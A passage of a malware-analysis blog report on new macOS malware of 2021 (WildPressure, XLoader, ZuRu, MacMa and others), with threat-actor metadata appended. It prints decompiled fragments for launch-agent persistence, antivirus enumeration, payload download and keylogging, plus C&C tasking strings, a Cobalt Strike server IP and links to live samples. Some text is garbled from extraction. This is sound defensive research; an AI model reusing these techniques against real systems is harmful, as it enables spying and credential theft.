_p_ _p_ _y_\n\nHowever the go on to state that:\n\n_\"Based on our telemetry, we suspect that the targets in the same Middle East region were related to the oil and gas_\n_industry.\" -Kaspersky_\n\n…thus it appears attacks (and infections) are likely both targeted and limited.\n\n**Persistence: Launch Item**\n\nThe core component of the malware is written in Python, making it fairly easily to analyze. For example, we can see it will persist as a launch\nagent (com.apple.pyapple.plist) to ensure that it is automatically restarted each time the user logs in:\n\n```\n 1 #osx const\n 2 PLIST_FILE_NAME = \"com.apple.pyapple.plist\"\n 3\n 4 def add_startup(self, file_path):\n 5 ...\n 6  plist = base64.b64decode(self.plist_base64)\n 7  plist = plist.replace('[pyscript]', file_path )\n 8 if(not os.path.exists( os.path.join(os.environ['HOME'],'Library','LaunchAgents'))):\n 9    os.mkdir(os.path.join(os.environ['HOME'],'Library','LaunchAgents'))\n10  fplist = open(self.path_plist,'w+' )\n11  fplist.write(plist)\n12  fplist.close()\n\n```\n\nOf course as is the case with other persistence events, **[BlockBlock, will detect this:](https://objective-see.com/products/blockblock.html)**\n\nWildPressure's persistence detected (BlockBlock)\n\n**Capabilities: Backdoor**\n```\nWildPressure supports a variety of commands, commonly found in backdoors. The supported commands are stored in the\nCommandsEn m class:\n\n```\n\n-----\n\n```\n3   Execution = 2\n4   Download = 3\n5   Update = 4\n6   Cleanup = 5\n7   Upload = 6\n8   RuntimeCMDConfig = 7\n9   SystemInfo = 8\n\n```\n\nFrom their names, it easy to see that WildPressure affords a remote attacker complete control over an infected system (plus the ability\nto upload/execute additional payloads).\n\nAs the backdoor is cross-platform, some of these commands contain platform-specific logic, for example on macOS, the SystemInfo is\nset to SystemInfo_OSX:\n\n```\n 1\n 2 ...\n 3 elif(osType == OSType.OSX):\n 4  self.dict_commands[CommandsEnum.SystemInfo] = SystemInfo_OSX()\n 5\n 6 ...\n 7 class SystemInfo_OSX(ICommand):\n 8 ...\n 9\n10 def execute(self):\n11     osversion = platform.mac_ver()\n12\n13     splitter = \"###\"\n14     os_info =platform.node() \\\n15 + splitter + 'MacOSX ' + osversion[0] + ' release:'+ platform.release() \\\n16 + splitter + platform.version() \\\n17 + splitter + platform.machine()\n18\n19     result = os_info\n20\n21 try:\n22       anti_info_name = \"unknown\"\n23 try:\n24         anti_info_name = CrossPlatformTools.get_antivirus_applications()\n25 except Exception as e:\n26 pass\n27       anti_info_state_num = 0\n28       result = result + splitter + anti_info_name\n29 + splitter + str(anti_info_state_num)\n30 except Exception as e:\n31 pass\n32\n33     CommandResult.is_error = False\n34     CommandResult.result = result\n35     CommandResult.cmd = ''\n\n```\n\n…interesting to note that that the malware, as part of the system information, attempts to enumerate installed anti-virus programs (via the\n```\nget_antivirus_applications function).\n\n```\nThe other commands are implemented in fairly standard manners. For example, here’s the core of the “Download” command:\n\n```\n1 ...\n2 file_path = self.crypto.decrypt(self.cmd_args.cmd.f).decode('utf-8')\n3 file_path = os.path.expandvars(file_path)\n\n```\n\n-----\n\n```\n7 file open(file_path, wb )\n8 file.write(file_content)\n9 file.close()\n\n```\n\nEasy to see its decrypting both the file’s path and contents (received from the C&C server), before writing it out to disk using the standard\nPython file I/O APIs.\n```\n XLoader\n XLoader is a cross-platform “Malware as a Service” that aims to steal passwords from infected users.\n  Download: XLoader (password: infect3d)\n\n```\nApparently the progeny, or evolution of the malware known as FormBook, researchers discovered the cross-platform XLoader for sale on\nunderground forums:\n\n_\"In one of our recent researches, we found that Formbook, one of the most prevalent data stealers, is now sold in the_\n_underground forum under a new name, XLoader, and has new capabilities that enable it to operate in macOS.\" -Checkpoint_\n\nXLoader for sale (credit: Checkpoint)\n\n**Writeups:**\n\n**[“The macOS evolution of Formbook”](https://research.checkpoint.com/2021/time-proven-tricks-in-a-new-environment-the-macos-evolution-of-formbook/)**\n\n**[“A macOS ‘Malware-as-a-Service’ Info Stealer and Keylogger”](https://www.sentinelone.com/blog/detecting-xloader-a-macos-malware-as-a-service-info-stealer-and-keylogger/)**\n\n**Infection Vector: Varies**\n\n“Malware as a Service” normally puts the onus of infection on the buyer. Thus, those that purchase XLoader would be responsible for\ninfection users.\n\n\n-----\n\n_\"The .jar file appears to be distributed as an attachment in a phishing lure, such as in this document Statement SKBMT_\n_09818.jar.\" -SentinelOne_\n\n**Persistence: Launch Agent**\n```\nXLoader will persist itself as a launch agent, though the name of its launch agent property list will be randomized:\n\n```\n_\"The label for the LaunchAgent ...[is] randomized and vary from execution to execution.\" -SentinelOne_\n\nBelow is an example of launch agent created by XLoader:\n\nXLoader launch agent (credit: SentinelOne)\n\nAs the RunAtLoad key is set to 1 (true), macOS will automatically start the binary (the malware), specified in the ProgramArguments\narray.\n\n**Capabilities: Password Stealer**\n```\nXLoader’s main goal is steal passwords from infected systems. However, Checkpoint researchers who also analyzed the malware, also\n\n```\nnoted it supports the following commands:\n\nDownload & execute\nUpdate\nUninstall\nVisit URL\nClear cookies\nRecover passwords (Firefox, Chrome)\nShutdown\nReboot\n\nOf course the download and execute capability means that the malware can update itself, install other tools, or other malware.\n\nThe password recovery appears to be limited to browser passwords, and only those of Firefox and Chrome.\n\nTo decrypt Firefox passwords, the Checkpoint researchers explain:\n\n_\"XLoader opens the file '/Library/Application Support/Firefox/Profiles/[prfile_name]/logins.json'. XLoader decrypts the data_\n_from the 'logins.json' files using the function 'PK11SDR_Decrypt' from the 'libnss3.dylib' library.\"_\n\n\n-----\n\nDecryption of Chrome's Passwords (credit: Checkpoint)\n\nTo exfiltrate the recovered passwords, researchers noted that, “_XLoader uses the HTTP protocol and sends data using GET or POST\nrequests…”\n```\n OSX.ZuRu\n ZuRu spreads via malicious sponsored search results, the exfiltrates extensive survey data, before\n installing a Cobalt Strike agent.\n  Download: ZuRu (password: infect3d)\n\n```\nIn September, users in China noticed that the Chinese search engine Baidu, was serving up sponsored ads which would lead to malicious\nwebsites (mirroring popular applications) that serve up trojanized applications.\n\n**Writeups:**\n\n**[“Made in China: OSX.ZuRu”](https://objective-see.com/blog/blog_0x66.html)**\n\n**[“感谢信！感谢百度搜索的推⼴让我被钓⻥中毒了⼀次”](https://zhuanlan.zhihu.com/p/408746101)**\n\n**Infection Vector: Sponsored Ads, leading to trojanized applications**\n\nThe Chinese researcher who first uncovered the malware posted the following image:\n\n\n-----\n\nMalicious sponsored search results, leading to ZuZu (credit: 潘⼩潘)\n\nThe image shows sponsored search results, when a user searches for the popular iTerm application. Unfortunately the ad points to a\nmalicious site, that mirrors the legitimate iTerm website, but hosts a trojanized version:\n\n\n-----\n\nThe malicious website, appears to offer a legitimate version of iTerm\n\nIf the user downloads and runs what they believe is a legitimate copy of iTerm from the malicious copy-cat site, they will be infected.\n\n**Persistence: Unknown**\n\nOnce run, the malware downloads two subsequent payloads. Both are described in more details, but the first is simply a survey script, while\nthe second is appears to be Cobalt Strike agent.\n\nThough neither was observed persisting, the later, the Cobalt Strike agent, perhaps could be instructed to persist once it checks in with the\nCobalt Strike Server.\n\nAlso, it’s worth noting that perhaps persistence is not needed, as the malware will be automatically re-run each time the trojanized iTerm\napplication is launched.\n\n**Capabilities: 1[st]-stage downloader**\n\nAs noted, when executed, ZuRu downloads and executes two additional payloads:\n\n\n-----\n\nWe can passively observe the execution of these payloads via my open-source **[ProcessMonitor:](https://objective-see.com/products/utilities.html#ProcessMonitor)**\n\n\n###### {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",  \"process\" : {   \"uid\" : 501,   \"arguments\" : [    \"python\",    \"/tmp/g.py\"   ]  } } ... {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",  \"process\" : {   \"signing info (computed)\" : {    \"signatureStatus\" : -67062   },   \"uid\" : 501,   \"arguments\" : [    \"/tmp/GoogleUpdate\"   ],   \"path\" : \"/private/tmp/GoogleUpdate\",   \"name\" : \"GoogleUpdate\"  } }\n\n\nThe Python script, g.py performs a comprehensive survey of the infected system. It then zips this up before exfiltrating it. If we allow the\nscript to run, we can then grab and extract the zip to see exactly what is in the survey:\n\n\n-----\n\nLooks like it includes the infected system’s keychain, bash history, hosts, and more:\n\n\n###### % cat tmp/tmp.txt 获取操作系统名称及版本号 : [Darwin-19.6.0-x86_64-i386-64bit] 获取操作系统版本号 : [Darwin Kernel Version 19.6.0: Thu Jun 18 20:49:00 PDT 2020; root:xnu-6153.141.1~1/RELEASE_X86_64] 获取操作系统的位数 : [('64bit', '')] 计算机类型 : [x86_64] 计算机的⽹络名称 : [users-mac.lan] 计算机处理器信息 : [i386] 获取操作系统类型 : [Darwin] 汇总信息 : [('Darwin', 'users-mac.lan', '19.6.0', 'Darwin Kernel Version 19.6.0: Thu Jun 18 20:49:00 PDT 2020; root:xnu-6153.141.1~1/RELEASE_X86_64', 'x86_64', 'i386')] 程序列表 : [] hosts⽂件 : [## # Host Database # # localhost is used to configure the loopback interface # when the system is booting. Do not change this entry. ## 127.0.0.1  localhost 255.255.255.255 broadcasthost ::1       localhost ] 当前⽤户名 : user test : [[u'Desktop', u'Documents', u'Downloads', u'Library', u'Movies', u'Music', u'Pictures', u'Public']]\n\n\n-----\n\nThe second payload is a is a Mach-O binary named GoogleUpdate. When executed, it attempts to connect to 47.75.96.198 (on\n[port 443). We can observe this connection via Netiquette:](https://objective-see.com/products/netiquette.html)\n\n\n-----\n\nAccording to VirusTotal, this IP address was found to be a Cobalt Strike Server:\n\n\n-----\n\n…thus it is likely that this binary in merely a Cobalt Strike agent (beacon).\n```\n OSX.MacMa (OSX.CDDS)\n MacMa is persistent (nationstate?) macOS implant, deployed via 0day/nday exploits.\n  Download: MacMa (password: infect3d)\n\n```\nIn November, researchers from Google published an intriguing report, that detailed a sophisticated watering hole campaign drops a new\nmacOS implant via 0day/nday exploits.\n\n**Writeups:**\n\n**[“Analyzing a watering hole campaign using macOS exploits”](https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/)**\n\n**[“Google Caught Hackers Using a Mac Zero-Day Against Hong Kong Users”](https://www.vice.com/en/article/93bw8y/google-caught-hackers-using-a-mac-zero-day-against-hong-kong-users)**\n\n**[“OSX.CDDS (OSX.MacMa): a Sophisticated Watering Hole Campaign drops a new macOS Implant!\"](https://objective-see.com/blog/blog_0x66.html)**\n\n**Infection Vector: 0-day/n-day exploits**\n\n[Google’s Threat Analysis Group (TAG), published the initial report on the MacMa.](https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/)\n\nIn this report, they detailed a highly targeted attack that leveraged both iOS and macOS exploits in order to remotely infect Apple users. As\n\n\n-----\n\nA webkit “n-day” RCE (patched as CVE-2021-1789 in January)\n\nAn XNU 0-day local privilege escalation (now patched as CVE-2021-30869).\nAccording to Google this exploit was, “was presented by Pangu Lab in a public talk at zer0con21 in April 2021 and Mobile Security\n_Conference (MOSEC) in July 2021”_\n\n**Persistence: Launch Item**\n```\nMacMa is installed as a launch daemon or agent (com.UserAgent.va.plist):\n\n```\n```\n 1 <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n 2 <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n 3 <plist version=\"1.0\">\n 4 <dict>\n 5 <key>Label</key>\n 6 <string>com.UserAgent.va</string>\n 7 <key>LimitLoadToSessionType</key>\n 8 <string>Aqua</string>\n 9 <key>ProgramArguments</key>\n10 <array>\n11 <string>/Users/user/Library/Preferences/UserAgent/lib/UserAgent</string>\n12 <string>-runMode</string>\n13 <string>ifneeded</string>\n14 </array>\n15 <key>RunAtLoad</key>\n16 <true/>\n17 <key>StartInterval</key>\n18 <integer>600</integer>\n19 <key>ThrottleInterval</key>\n20 <integer>2</integer>\n21 <key>WorkingDirectory</key>\n22 <string>/Users/user/Library/Preferences/UserAgent/lib</string>\n23 </dict>\n24 </plist>\n\n```\n\nAs the RunAtLoad key is set to true the specified binary (the MacMa backdoor)\n```\n~/Library/Preferences/UserAgent/lib/UserAgent will be persistently executed by macOS each time the user logs in.\n\n```\n```\nThe UserAgent binary was originally submitted to VirusTotal on `2019-12-01`.\n…and if we analyze the submission meta-data, we can see it was originally submitted to VirusTotal by\na user, via one of my Objective-See tools (which integrate with VirusTotal)! How freaking cool!?\n\n```\n\n**Capabilities: Backdoor**\n\nThe MacMa malware, is fully featured backdoor, which drops additional helper tools, plus directly implements a myriad of features.\n\nThe custom helper tools include:\n```\n  arch (SHA-1 c4511ad16564eabb2c179d2e36f3f1e59a3f1346)\n\n```\nThis binary invokes a function, aptly named captureScreen, to perform a screen capture, via Apple’s Core Graphic APIs (e.g.\n```\n  CGWindowListCreateImageFromArray). It appears to then save it out to user-specified file.\n\n```\n\n-----\n\nfollowing:\n\n\n###### % ./at uuid=564D028C-69EF-7793-5BD9-8CC893CB8C8D userName=user version=Version 10.15.6 (Build 19G2021) equipmentType=VMware7,1 mac=00:0c:29:cb:8c:8d ip= diskFreeSpace=11251048448/42605699072 availableMemory=2098040832/2147483648 cpu_info=Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz\n\n```\n  kAgent (SHA-1: D811E97461741E93813EECD8E5349772B1C0B001)\n\n```\nA quick triage of this binary reveals it’s a simple keylogger that leverages Core Graphics Event Taps to intercept user keystrokes:\n\n```\n 1 int sub_1000028f0(int arg0) {\n 2\n 3   runLoop = CFRunLoopGetCurrent();\n 4   runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, *g_eventTap, 0x0);\n 5\n 6   CFRunLoopAddSource(*runLoop, runLoopSource, kCFRunLoopCommonModes);\n 7   CGEventTapEnable(*g_eventTap, 0x1);\n 8\n 9   CFRunLoopRun();\n10\n11 return 0x0;\n12 }\n\n```\n\nTo determine the capabilities supported by MacMa we can extract strings in the format <number>CDDS, as these show the requests the\nimplant supports (from a remote C&C server):\n\n“24CDDSScreenCaptureRequest”\n“28CDDSAutoScreenCaptureRequest”\n“21CDDSScreenCaptureInfo”\n“33CDDSScreenCaptureParameterRequest”\n“19CDDSFileInfoRequest”\n“12CDDSFileInfo”\n“18CDDSDirInfoRequest”\n“11CDDSDirInfo”\n“17CDDSZipDirRequest”\n“21CDDSZipDirRequestInfo”\n“22CDDSExecuteFileRequest”\n“19CDDSTerminalConnect”\n“22CDDSTerminalDisConnect”\n“17CDDSTerminalInput”\n“18CDDSTerminalOutput”\n“20CDDSUninstallRequest”\n“20CDDSClearDataRequest”\n“10CDDSCmdAck”\n“18CDDSReqMacBaseInfo”\n“15CDDSMacBaseInfo”\n“18CDDSReqMacFileList”\n“15CDDSMacFileList”\n“20CDDSMacFileListReply”\n“20CDDSReqMacSearchFile”\n“17CDDSMacSearchFile”\n“22CDDSMacSearchFileReply”\n“21CDDSSt M S hFil ”\n\n\n-----\n\np y\n“14CDDSReqMacTree”\n“13CDDSDriveInfo”\n\n…based off these tasking strings, it’s clear to see MacMa supports a myriad of features!\n\n### And All Others\n\nThis blog post provided a comprehensive technical analysis of the new mac malware of 2021. However it did not cover adware or malware\nfrom previous years. Of course, this is not to say such items are unimportant …especially when such adware is compiled to natively target\nApple’s new arm64 architecture (M1), or when existing malware is analyzed for the first time.\n\nAs such, here I’ve include a list (and links to detailed writeups) of other notable items from 2021, for the interested reader.\n```\n    OSX.OSAMiner\n\n```\n(included here, as it was first analyzed in 2021)\n\n[In January, SentinelOne researcher Phil Stokes published in in depth analysis of a crypto-currency miner, dubbed OSXMiner.](https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/)\n\nPhil noted that although active for a least five years, the malware had resisted analysis, “due to its use of multiple run-only\n_AppleScripts”_\n\nOSAMiner's AppleScript Disassembled (credit: SentinelOne)\n\nThe writup is a must read, not so much for the details of the malware (crypto-miners aren’t all that interesting), but rather as Phil\ncomprehensively discusses how analyze run-only AppleScripts!\n\nWriteup:\n[“FADE DEAD | Adventures in Reversing Malicious Run-Only AppleScripts”](https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/)\n```\n    OSX.Pirrit\n\n```\n\n-----\n\nIn order to run natively on the M1 arm-based CPU, the developers compiled the adware into a universal binary, containing both Intel\nand arm64 code:\n\n\n###### $ file GoSearch GoSearch: Mach-O universal binary with 2 architectures:  [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64]\n\n GoSearch (for architecture x86_64): Mach-O 64-bit executable x86_64 GoSearch (for architecture arm64): Mach-O 64-bit executable arm64\n\n\n…which means, as malware analysis, we must (now) understand how to read arm(64) disassembly, for example to uncover the\nadware’s anti-analysis logic:\n\n```\n1 0000000100054118     movz    x0, #0x1a\n2 000000010005411c     movz    x1, #0x1f\n3 0000000100054120     movz    x2, #0x0\n4 0000000100054124     movz    x3, #0x0\n5 0000000100054128     movz    x16, #0x0\n6 000000010005412c     svc    #0x80\n\n```\n```\nFor more information on reversing malicious code compiled to run natively on Apple Silicon\n(read: arm64), see my whitepaper on the topic:\n           An introduction to analysing arm64 malware targeting macos.\n\n```\n\nWriteup:\n[“Arm’d & Dangerous: Malicious Code, now native on Apple Silicon”](https://objective-see.com/blog/blog_0x62.html)\n```\n OSX.Convuster\n\n```\n(included here, as it is new adware)\n\nIn March, researchers at Kaspersky detailed a new adware, named Convuster.\n\nConvuster's Rust artifacts (credit: Kaspersky)\nWriteup:\n[“Convuster: macOS adware now in Rust”](https://securelist.com/convuster-macos-adware-in-rust/101258/)\n```\n OSX.??? (Cobalt Strike wrapper)\n\n```\n(included here, as it appears to be a new/custom macOS wrapper)\n\n[In April, a twitter user Colin (@th3_protoCOL), posted information about a Cobalt Strike agent, packed (via UPX) and packaged as](https://twitter.com/th3_protoCOL)\nMach-O binary:\n\n\n-----\n\n@ _p\n\n#### Undetected MacOS malware\n\n Communicates with known #CobaltStrike C2 servers (122.112.241[.]119:443) Zero AV detection Packed by UPX Opens /etc/master.passwd\n\n Can anyone verify? virustotal.com/gui/file/4116f… MD5 - 8ae2803b92dd52e896c3808df5e17b65\n\n[2:55 AM · Apr 6, 2021](https://twitter.com/th3_protoCOL/status/1379417366069661701?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1379417366069661701%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n[Read the full conversation on Twitter](https://twitter.com/th3_protoCOL/status/1379417366069661701?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1379417366069661701%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n5 [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1379417366069661701%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html&in_reply_to=1379417366069661701) Share this Tweet\n\n[Read 2 replies](https://twitter.com/th3_protoCOL/status/1379417366069661701?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1379417366069661701%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x6B.html)\n\n```\n OSX.Hydromac\n\n```\n(included here, as it is new adware)\n\nIn June, Taha Karim (@lordx64) of Confiant detailed a new adware specimen, OSX.Hydromac:\n\nOSX.Hydromac Adware\n\nWriteup:\n[“OSX/Hydromac: New Mac adware, leaked from a flashcards app”](https://objective-see.com/blog/blog_0x4E.html)\n```\n OSX.UpdateAgent / OSX.WizardUpdate\n\n```\n(included here it appears to be a new variant)\n\n\n-----\n\n```\n OSX.GreenLambert / OSX.DoubleFantasy\n\n```\n(included here, as they were first analyzed in 2021)\n\n[In October at v4.0 of the macOS security conference, “Objective by the Sea” Runa Sandvik (@runasand) and myself presented](https://objectivebythesea.com/)\ndetails on two US government macOS implants: GreenLambert and DoubleFantasy.\n\n\n-----\n\nWriteup:\n[“Made In America: Analyzing US Spy Agencies' macOS Implants”](https://objectivebythesea.com/v4/talks/OBTS_v4_rSandvik_pWardle.pdf)\n\n### Detections\n\nNew malware is notoriously difficult to detect via traditional signature-based approaches …as, well, it’s new! A far better approach is to\nleverage heuristics or behaviors, that can detect such malware, even with no a priori knowledge of the specific (new) threats.\n\nFor example, imagine you open an Office Document that (unbeknownst to you) contains an exploit or malicious macros which installs a\npersistent backdoor. This is clearly an unusual behavior, that should be detected and alerted upon.\n\nGood news, Objective-See’s free macOS security tools do not leverage signatures, but instead monitor for such (unusual, and likely\nmalicious) behaviors.\n\nThis allows them to detect and alert on various behaviors of all the new malware of 2021 (with no prior knowledge of the malware).\n\nFor example, let’s look at how MacMa the (likely nation-state) implant deployed via exploits, was detected by our free tools:\n\n[First, BlockBlock detects MacMa’s attempt at persistence …specifically when it executes cp to create a launch item:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nBlockBlock's alert\n\n**[LuLu, our free, open-source firewall detects when the implant first attempts to beacon out to its command and control server to check-in](https://objective-see.com/products/lulu.html)**\nand ask for tasking:\n\nLuLu's alert\n\n[And if you’re worried that you are already infected? KnockKnock can uncover the malware’s persistence (after the fact):](https://objective-see.com/products/knockknock.html)\n\n\n-----\n\nKnockKnock's detection\n```\n For more information about our free, open-source tools, see:\n                         Objective-See's Tools.\n\n### Conclusion:\n\n```\nWell that’s a wrap! Thanks for joining our “journey” as we wandered through the macOS malware of 2021.\n\nWith the continued growth and popularity of macOS (especially in the enterprise!), 2022 will surely bring a bevy of new macOS malware.\n…so, stay safe out there!\n\n```\n Interested in general Mac malware analysis techniques?\n           You're in luck, as I've written an entire (free) book on this\n           very topic:\n                 The Art Of Mac Malware, Vol. 0x1: Analysis\n\n```\n\n© 2021 Objective-See [Support Us!](https://www.patreon.com/bePatron?u=4857001) ! ✉\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/Report/Objective-See/MacMalware_2021.pdf"
    ],
    "report_names": [
        "MacMalware_2021"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3c652e4b-2f17-4e18-bd05-af12c27e76fb",
            "created_at": "2023-11-30T02:00:07.302263Z",
            "updated_at": "2025-03-27T02:00:03.258682Z",
            "deleted_at": null,
            "main_name": "WildPressure",
            "aliases": [],
            "source_name": "MISPGALAXY:WildPressure",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c3ef437d-e8fa-4250-9a99-89a403035ad2",
            "created_at": "2022-10-25T16:07:24.406019Z",
            "updated_at": "2025-03-27T02:02:10.210953Z",
            "deleted_at": null,
            "main_name": "WildPressure",
            "aliases": [
                "WilePressure"
            ],
            "source_name": "ETDA:WildPressure",
            "tools": [
                "Milum"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
